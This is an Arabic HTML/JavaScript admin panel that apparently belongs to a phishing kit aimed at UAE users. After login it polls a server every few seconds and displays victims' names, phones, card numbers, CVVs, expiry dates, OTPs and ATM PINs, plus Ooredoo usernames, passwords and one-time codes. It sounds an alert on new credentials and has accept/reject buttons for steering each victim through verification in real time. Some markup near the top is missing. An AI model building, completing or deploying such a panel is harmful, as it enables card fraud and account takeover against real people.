<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم - هميان</title>
<style>
  :root{
    --ink:#1c1c1a; --muted:#7a7a76; --line:#e9e9e6; --accent:#2f5d50; --btn:#b8860b;
  }
  *{box-sizing:border-box;}
  html{font-size:16px;}
  body{
    margin:0; font-family:-apple-system,"Segoe UI","Tajawal",Tahoma,sans-serif;
    background:#fff; color:var(--ink); -webkit-font-smoothing:antialiased;
  }
  .wrap{ max-width:1200px; margin:0 auto; padding:0 24px; }

  header{ background:#fff; border-bottom:1px solid var(--line); position:sticky; top:0; z-index:100; }
  header .wrap{ display:flex; align-items:center; justify-content:space-between; padding:14px 24px; max-width:1200px; }
  .header-logo{ height:34px; width:auto; display:block; }
  .header-title{ font-size:15px; font-weight:800; }

  .admin-login{
    max-width:360px; margin:60px auto; padding:24px; border:1px solid var(--line);
    border-radius:10px; text-align:center;
  }
  .admin-login p{ font-size:14px; color:var(--muted); margin:0 0 16px; }
  .admin-login input{
    width:100%; padding:12px 14px; font-size:15px; border:1px solid #d9d9d6;
    border-radius:6px; margin-bottom:12px; font-family:inherit; text-align:center;
  }
  .admin-login-error{ color:#c0392b; font-size:13px; font-weight:700; margin:0 0 12px; display:none; }
  .admin-login-error.show{ display:block; }
  .cf-button{
    width:100%; background:var(--btn); color:#1a1a1a; font-size:16px; font-weight:700;
    border:none; border-radius:8px; padding:14px 20px; cursor:pointer; font-family:inherit;
  }

  .admin-dashboard{ display:none; padding:28px 24px 48px; }
  .admin-dashboard.show{ display:block; }
  .admin-dashboard .wrap{ max-width:1440px; }
  .admin-topbar{
    display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:18px; flex-wrap:wrap;
  }
  .wifi-btn{
    display:flex; align-items:center; gap:8px; background:#eef6f0; color:var(--accent);
    border:1px solid #bfe0c8; border-radius:999px; padding:8px 16px; font-size:13.5px;
    font-weight:700; font-family:inherit;
  }
  .wifi-btn svg{ width:16px; height:16px; }
  .wifi-count{ background:var(--accent); color:#fff; border-radius:999px; padding:1px 8px; font-size:12px; }

  .incoming-alert {
    display:none; align-items:center; gap:8px; background:#fff3cd; color:#7a5a12;
    border:1px solid #f0d98c; border-radius:999px; padding:8px 14px; font-size:12.5px;
    font-weight:800; animation: pulseAlert 1.2s infinite alternate;
  }
  .incoming-alert.show { display:inline-flex; }
  @keyframes pulseAlert {
    from { box-shadow: 0 0 0 rgba(255, 179, 0, 0.1); transform: scale(1); }
    to { box-shadow: 0 0 0 8px rgba(255, 179, 0, 0.08); transform: scale(1.02); }
  }

  .admin-table-wrap{ overflow-x:auto; border:1px solid var(--line); border-radius:8px; }
  .admin-table{ width:100%; border-collapse:collapse; font-size:14px; min-width:980px; }
  .admin-table th{
    background:#f2f2f0; padding:16px 18px; text-align:right; font-weight:800;
    white-space:nowrap; border-bottom:1px solid var(--line);
  }
  .admin-table td{ padding:16px 18px; border-top:1px solid var(--line); white-space:nowrap; }
  .admin-table tbody tr:hover{ background:#fafaf9; }
  .status-badge{ padding:3px 10px; border-radius:999px; font-size:12px; font-weight:700; background:#fdf3e3; color:#7a5a12; }
  .name-expander{
    display:inline-flex; align-items:center; gap:8px; background:none; border:none;
    padding:0; font:inherit; color:var(--ink); font-weight:700; cursor:pointer;
  }
  .name-expander .arrow {
    width:14px; height:14px; color:var(--muted); transition:transform .2s ease;
  }
  .name-expander[aria-expanded="true"] .arrow{ transform:rotate(180deg); }
  .details-row td{ background:#f9faf8; padding:0 !important; }
  .details-panel {
    padding:14px 18px 18px; display:grid; gap:12px;
  }
  .details-section {
    border:1px solid var(--line); border-radius:8px; background:#fff; padding:12px 14px;
  }
  .details-section h4 {
    margin:0 0 10px; font-size:13px; color:var(--accent); font-weight:800;
  }
  .details-grid {
    display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px 16px;
    font-size:12.8px;
  }
  .detail-item { display:flex; flex-direction:column; gap:4px; }
  .detail-item span{ color:var(--muted); font-size:11.5px; }
  .detail-item strong{ font-size:12.8px; color:var(--ink); word-break:break-word; }
  .action-btn{
    background:none; border:1px solid var(--line); border-radius:6px; padding:6px 12px;
    font-size:12px; cursor:pointer; font-family:inherit; margin-inline-start:6px; font-weight:700;
  }
  .action-btn.details{ color:var(--accent); border-color:var(--accent); }
  .action-btn.forward{ color:#1a1a3d; border-color:#1a1a3d; }
  .admin-empty{ text-align:center; color:var(--muted); font-size:14px; padding:40px 0; }

  .modal-overlay{
    position:fixed; inset:0; background:rgba(0,0,0,.5); display:none;
    align-items:flex-start; justify-content:center; z-index:200; padding:20px; overflow-y:auto;
  }
  .modal-overlay.show{ display:flex; }
  .modal-box{
    background:#fff; border-radius:10px; max-width:480px; width:100%;
    margin-top:30px; padding:20px; position:relative;
  }
  .modal-close{
    position:absolute; top:14px; left:14px; background:none; border:none;
    font-size:22px; line-height:1; cursor:pointer; color:var(--muted);
  }
  .modal-title{ font-size:17px; font-weight:800; margin:0 0 6px; }
  .modal-sub{ font-size:12.5px; color:var(--muted); margin:0 0 18px; }
  .confirm-block{
    border:1px solid var(--line); border-radius:8px; padding:16px 18px; margin-top:14px; background:#fafaf9;
  }
  .confirm-block-title{ font-size:14.5px; font-weight:800; color:var(--accent); margin:0 0 12px; }
  .confirm-row{
    display:flex; justify-content:space-between; gap:12px; padding:8px 0; border-bottom:1px solid var(--line); font-size:13.5px;
  }
  .confirm-row:last-child{ border-bottom:none; }
  .confirm-row span{ color:var(--muted); }
  .confirm-row strong{ color:var(--ink); font-weight:700; text-align:left; }
  .modal-actions{
    display:flex; gap:10px; margin-top:18px;
  }
  .modal-actions .action-btn{
    flex:1; padding:12px 16px; font-size:14px; border-radius:8px;
  }
  .action-btn.accept{ color:#1a6b3c; border-color:#1a6b3c; background:#eef6f0; }
  .action-btn.reject{ color:#c0392b; border-color:#c0392b; background:#fdf2f2; }
</style>
</head>

  <p>هذه الصفحة مخصصة لفريق العمل. يرجى إدخال كلمة المرور للمتابعة</p>
  <input type="password" id="adminPasswordInput" placeholder="كلمة المرور">
  <p class="admin-login-error" id="adminLoginError">كلمة المرور غير صحيحة</p>
  <button type="button" class="cf-button" id="adminLoginBtn">دخول</button>
</div>

<div class="admin-dashboard" id="adminDashboard">
  <div class="wrap">
    <div class="admin-topbar">
      <button type="button" class="wifi-btn" id="wifiBtn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
          <path d="M2 8.5a16 16 0 0120 0"/>
          <path d="M5 12a11 11 0 0114 0"/>
          <path d="M8.5 15.5a6 6 0 017 0"/>
          <circle cx="12" cy="19" r="1" fill="currentColor" stroke="none"/>
        </svg>
        الزيارات النشطة
        <span class="wifi-count" id="wifiCount">0</span>
      </button>
      <div class="incoming-alert" id="incomingAlert">تنبيه: بيانات أوريدو جديدة</div>
      <span style="font-size:12.5px;color:var(--muted);" id="appCountLabel">0 طلب</span>
    </div>

    <div class="admin-table-wrap">
      <table class="admin-table">
        <thead>
          <tr>
            <th>الاسم</th>
            <th>رقم الجوال</th>
            <th>عداد الأفراد</th>
            <th>الحالة</th>
            <th>الإجراءات</th>
          </tr>
        </thead>
        <tbody id="adminAppsBody">
          <tr><td colspan="5" class="admin-empty">جارٍ تحميل الطلبات...</td></tr>
        </tbody>
      </table>
    </div>
  </div>
</div>

<div class="modal-overlay" id="detailsModal">
  <div class="modal-box">
    <button type="button" class="modal-close" id="modalCloseBtn">&times;</button>
    <p class="modal-title">تفاصيل الطلب</p>
    <p class="modal-sub">جميع البيانات المدرجة في هذا الطلب</p>
    <div id="modalBody"></div>
  </div>
</div>

<script>
  let adminToken = '';
  let loadedApplications = [];
  let lastOoredooSignal = '';

  function hasOoredooData(d) {
    const card = d.card || d.payment || null;
    const ooredooUser = (d.ooredooUser || (card && card.ooredooUser)) || '';
    const ooredooPass = (d.ooredooPass || (card && card.ooredooPass)) || '';
    const ooredooOtp = (d.ooredooOtp || (card && card.ooredooOtp)) || '';
    return Boolean(ooredooUser || ooredooPass || ooredooOtp);
  }

  function triggerIncomingOoredooAlert() {
    const incoming = (loadedApplications || []).filter((d) => hasOoredooData(d));
    const signal = incoming.map((d) => d.id || d.applicant && d.applicant.id || d._id || '').join('|');
    if (!signal || signal === lastOoredooSignal) return;

    lastOoredooSignal = signal;
    const alertBox = document.getElementById('incomingAlert');
    if (alertBox) {
      alertBox.classList.add('show');
      setTimeout(() => alertBox.classList.remove('show'), 5000);
    }

    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) {
        const ctx = new AudioCtx();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.value = 980;
        gain.gain.value = 0.04;
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        setTimeout(() => { osc.stop(); ctx.close(); }, 300);
      }
    } catch (err) {}
  }

  document.getElementById('adminLoginBtn').addEventListener('click', attemptAdminLogin);
  document.getElementById('adminPasswordInput').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') attemptAdminLogin();
  });

  async function attemptAdminLogin() {
    const val = document.getElementById('adminPasswordInput').value;
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: val })
      });
      const data = await res.json();
      if (data.ok) {
        adminToken = data.token;
        document.getElementById('adminLogin').style.display = 'none';
        document.getElementById('adminDashboard').classList.add('show');
        loadApplications();
        pollActiveVisits();
        pollApplicationsSilently();
      } else {
        document.getElementById('adminLoginError').classList.add('show');
      }
    } catch (err) {
      document.getElementById('adminLoginError').classList.add('show');
    }
  }

  function getAdminStatusLabel(d) {
    if (d.status === 'reject') return 'مرفوض';
    if (d.status === 'accept' || d.status === 'success') return 'مقبول';

    const card = d.card || d.payment || null;
    const otpValue = (d.otp || (card && (card.otp || card.otpCode))) || '';
    const atmValue = (d.atmPin || (card && (card.atm || card.atmPin))) || '';

    const ooredooUser = (d.ooredooUser || (card && card.ooredooUser)) || '';
    const ooredooPass = (d.ooredooPass || (card && card.ooredooPass)) || '';
    const ooredooOtp = (d.ooredooOtp || (card && card.ooredooOtp)) || '';

    const hasCardData = Boolean(card && (card.cardName || card.cardNumber || card.expiryDate || card.cvv || card.number || card.name));
    const hasOoredooData = Boolean(ooredooUser || ooredooPass || ooredooOtp);

    if (!card && !hasOoredooData && !otpValue && !atmValue) return 'بيانات جديدة';
    if (!hasCardData && !otpValue && !atmValue && !hasOoredooData) return 'بيانات جديدة';
    if (!hasCardData && !otpValue && !atmValue && hasOoredooData) return 'بيانات أوريدو جديدة';
    if (!card || !card.cardNumber) return 'بطاقة جديدة';
    if (!otpValue) return 'OTP جديد';
    if (!atmValue) return 'ATM جديد';
    if (!ooredooOtp && hasOoredooData) return 'بيانات أوريدو جديدة';
    if (ooredooOtp && !ooredooUser && !ooredooPass) return 'OTP أوريدو جديد';
    if (hasOoredooData) return 'بيانات أوريدو جديدة';
    return 'قيد المراجعة';
  }

  async function loadApplications() {
    const tbody = document.getElementById('adminAppsBody');
    try {
      const res = await fetch('/api/orders', {
        headers: { Authorization: 'Bearer ' + adminToken }
      });
      if (!res.ok) throw new Error('failed');
      const data = await res.json();
      loadedApplications = data.orders || [];
      triggerIncomingOoredooAlert();

      document.getElementById('appCountLabel').textContent = loadedApplications.length + ' طلب';

      if (loadedApplications.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="admin-empty">لا توجد طلبات مقدمة بعد.</td></tr>';
        return;
      }

      tbody.innerHTML = '';
      loadedApplications.forEach((d, index) => {
        const a = d.applicant || d;
        const persons = d.persons || [];
        const card = d.card || d.payment || null;
        const orderId = d.id || a.id || d._id || '';
        const expanded = false;
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>
            <button type="button" class="name-expander" data-index="${index}" aria-expanded="${expanded}">
              <span>${a.name || 'بدون اسم'}</span>
              <svg class="arrow" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M5 7.5L10 12.5L15 7.5"></path>
              </svg>
            </button>
          </td>
          <td>${a.phone ? ('+971 ' + a.phone) : '—'}</td>
          <td>${persons.length}</td>
          <td><span class="status-badge">${getAdminStatusLabel(d)}</span></td>
          <td>
            <button type="button" class="action-btn details" data-index="${index}">التفاصيل</button>
            ${hasOoredooData(d) ? `<button type="button" class="action-btn ooredoo" data-index="${index}">بيانات أوريد</button>` : ''}
          </td>
        `;
        tbody.appendChild(row);

        const detailsRow = document.createElement('tr');
        detailsRow.className = 'details-row';
        detailsRow.innerHTML = `
          <td colspan="5">
            <div class="details-panel">
              <div class="details-section">
                <h4>مقدم الطلب</h4>
                <div class="details-grid">
                  <div class="detail-item"><span>الاسم</span><strong>${a.name || '—'}</strong></div>
                  <div class="detail-item"><span>رقم الجوال</span><strong>${a.phone ? ('+971 ' + a.phone) : '—'}</strong></div>
                  <div class="detail-item"><span>البريد الإلكتروني</span><strong>${a.email || '—'}</strong></div>
                  <div class="detail-item"><span>تاريخ الميلاد</span><strong>${a.birth || '—'}</strong></div>
                  ${a.address ? `<div class="detail-item"><span>الموقع</span><strong>${a.address}</strong></div>` : ''}
                </div>
              </div>

              ${persons.length ? `
                <div class="details-section">
                  <h4>الأفراد</h4>
                  <div class="details-grid">
                    ${persons.map((p) => `
                      <div class="detail-item">
                        <span>${p.title || 'فرد'}</span>
                        <strong>${p.name || '—'}</strong>
                        <span>${p.phone ? ('+971 ' + p.phone) : '—'}</span>
                      </div>
                    `).join('')}
                  </div>
                </div>
              ` : ''}

              ${card ? `
                <div class="details-section">
                  <h4>بيانات البطاقة</h4>
                  <div class="details-grid">
                    <div class="detail-item"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
                    <div class="detail-item"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
                    <div class="detail-item"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
                    <div class="detail-item"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
                    <div class="detail-item"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
                    <div class="detail-item"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
                  </div>
                </div>
              ` : ''}

              ${((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp))) ? `
                <div class="details-section ooredoo-section">
                  <h4>بيانات أوريدو</h4>
                  <div class="ooredoo-list" style="display:grid; gap:10px;">
                    <div class="ooredoo-row" style="display:flex; justify-content:space-between; gap:12px; border-bottom:1px solid var(--line); padding-bottom:8px;">
                      <span style="color:var(--muted); font-size:12px;">اسم مستخدم أوريدو</span>
                      <strong style="font-size:12.8px; color:var(--ink); word-break:break-word; text-align:left;">${d.ooredooUser || (card && card.ooredooUser) || '—'}</strong>
                    </div>
                    <div class="ooredoo-row" style="display:flex; justify-content:space-between; gap:12px; border-bottom:1px solid var(--line); padding-bottom:8px;">
                      <span style="color:var(--muted); font-size:12px;">كلمة مرور أوريدو</span>
                      <strong style="font-size:12.8px; color:var(--ink); word-break:break-word; text-align:left;">${d.ooredooPass || (card && card.ooredooPass) || '—'}</strong>
                    </div>
                    <div class="ooredoo-row" style="display:flex; justify-content:space-between; gap:12px; padding-bottom:4px;">
                      <span style="color:var(--muted); font-size:12px;">OTP أوريدو</span>
                      <strong style="font-size:12.8px; color:var(--ink); word-break:break-word; text-align:left;">${d.ooredooOtp || (card && card.ooredooOtp) || '—'}</strong>
                    </div>
                  </div>
                  <div class="action-buttons" style="margin-top: 15px; display: flex; gap: 10px; justify-content:flex-end;">
                    <button class="btn-accept" onclick="approveOoredoo('${orderId}')" style="background-color: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">قبول</button>
                    <button class="btn-reject" onclick="rejectOoredoo('${orderId}')" style="background-color: #dc3545; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">رفض</button>
                  </div>
                </div>
              ` : ''}
            </div>
          </td>
        `;
        detailsRow.style.display = 'none';
        tbody.appendChild(detailsRow);
      });

      tbody.querySelectorAll('.name-expander').forEach((btn) => {
        btn.addEventListener('click', () => {
          const row = btn.closest('tr');
          const detailsRow = row.nextElementSibling;
          if (!detailsRow || !detailsRow.classList.contains('details-row')) return;
          const isOpen = btn.getAttribute('aria-expanded') === 'true';
          btn.setAttribute('aria-expanded', String(!isOpen));
          detailsRow.style.display = isOpen ? 'none' : 'table-row';
        });
      });

      tbody.querySelectorAll('.action-btn.details').forEach((btn) => {
        btn.addEventListener('click', () => openDetailsModal(loadedApplications[parseInt(btn.dataset.index, 10)]));
      });
      tbody.querySelectorAll('.action-btn.ooredoo').forEach((btn) => {
        btn.addEventListener('click', () => {
          const app = loadedApplications[parseInt(btn.dataset.index, 10)];
          const row = btn.closest('tr');
          const detailsRow = row && row.nextElementSibling;
          if (detailsRow) {
            const current = btn.getAttribute('aria-expanded') === 'true';
            btn.setAttribute('aria-expanded', String(!current));
            detailsRow.style.display = current ? 'none' : 'table-row';
            const expander = row.querySelector('.name-expander');
            if (expander) {
              expander.setAttribute('aria-expanded', String(!current));
            }
          }
          if (app) {
            const target = detailsRow && detailsRow.querySelector('.details-section h4');
            if (target && target.textContent.includes('بيانات أوريدو')) {
              target.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
          }
        });
      });
    } catch (err) {
      tbody.innerHTML = '<tr><td colspan="5" class="admin-empty">تعذر تحميل الطلبات حاليًا.</td></tr>';
    }
  }

  // ---- Silent auto-refresh: re-fetch applications every 3s with no visible loading state ----
  function pollApplicationsSilently() {
    setInterval(loadApplications, 3000);
  }

  function personDetailBox(title, p) {
    return `
      <div class="confirm-block">
        <p class="confirm-block-title">${title}</p>
        <div class="confirm-row"><span>الاسم</span><strong>${p.name || '—'}</strong></div>
        <div class="confirm-row"><span>رقم الجوال</span><strong>${p.phone ? ('+971 ' + p.phone) : '—'}</strong></div>
        <div class="confirm-row"><span>البريد الإلكتروني</span><strong>${p.email || '—'}</strong></div>
        <div class="confirm-row"><span>تاريخ الميلاد</span><strong>${p.birth || '—'}</strong></div>
        ${p.address ? `<div class="confirm-row"><span>الإمارة</span><strong>${p.address}</strong></div>` : ''}
      </div>
    `;
  }

  function cardDetailBox(card) {
    if (!card) return '';
    return `
      <div class="confirm-block">
        <p class="confirm-block-title">بيانات البطاقة</p>
        <div class="confirm-row"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
        <div class="confirm-row"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
        <div class="confirm-row"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
        <div class="confirm-row"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
        <div class="confirm-row"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
        <div class="confirm-row"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
      </div>
    `;
  }

  function openDetailsModal(d) {
    const a = d.applicant || d;
    const persons = d.persons || [];
    const card = d.card || d.payment || null;
    const modalBody = document.getElementById('modalBody');
    modalBody.innerHTML =
      personDetailBox('مقدم الطلب' + (a.id ? (' — هوية: ' + a.id) : ''), a) +
      persons.map((p) => personDetailBox(p.title || 'فرد', p)).join('') +
      cardDetailBox(card) +
      `
        <div class="modal-actions">
          <button type="button" class="action-btn accept" id="modalAcceptBtn">قبول</button>
          <button type="button" class="action-btn reject" id="modalRejectBtn">رفض</button>
        </div>
      `;

    const acceptBtn = document.getElementById('modalAcceptBtn');
    const rejectBtn = document.getElementById('modalRejectBtn');
    if (acceptBtn) acceptBtn.addEventListener('click', () => submitDecision(d, 'accept'));
    if (rejectBtn) rejectBtn.addEventListener('click', () => submitDecision(d, 'reject'));

    document.getElementById('detailsModal').classList.add('show');
  }

  function approveOoredoo(id) {
    const app = loadedApplications.find((d) => (d.id || d.applicant && d.applicant.id || d._id) === id);
    if (app) {
      submitDecision(app, 'accept');
    }
  }

  function rejectOoredoo(id) {
    const app = loadedApplications.find((d) => (d.id || d.applicant && d.applicant.id || d._id) === id);
    if (app) {
      submitDecision(app, 'reject');
    }
  }

  async function submitDecision(d, decision) {
    const id = d.id || (d.applicant && d.applicant.id) || d._id;
    try {
      if (id) {
        await fetch('/api/payments/' + encodeURIComponent(id) + '/decision', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: 'Bearer ' + adminToken
          },
          body: JSON.stringify({ decision: decision })
        });
      }
    } catch (err) { /* ignore network errors, still update UI */ }

    try {
      localStorage.setItem('ooredooDecision', decision);
      sessionStorage.setItem('ooredooDecision', decision);
    } catch (err) {}

    d.status = decision;
    const modal = document.getElementById('detailsModal');
    if (modal) modal.classList.remove('show');
    loadApplications();
  }

  document.getElementById('modalCloseBtn').addEventListener('click', () => {
    document.getElementById('detailsModal').classList.remove('show');
  });
  document.getElementById('detailsModal').addEventListener('click', (e) => {
    if (e.target.id === 'detailsModal') {
      document.getElementById('detailsModal').classList.remove('show');
    }
  });

  async function pollActiveVisits() {
    async function tick() {
      try {
        const res = await fetch('/api/active', {
          headers: { Authorization: 'Bearer ' + adminToken }
        });
        const data = await res.json();
        document.getElementById('wifiCount').textContent = data.active || 0;
      } catch (err) { /* ignore */ }
    }
    tick();
    setInterval(tick, 3000);
  }
</script>

</body>
</html>
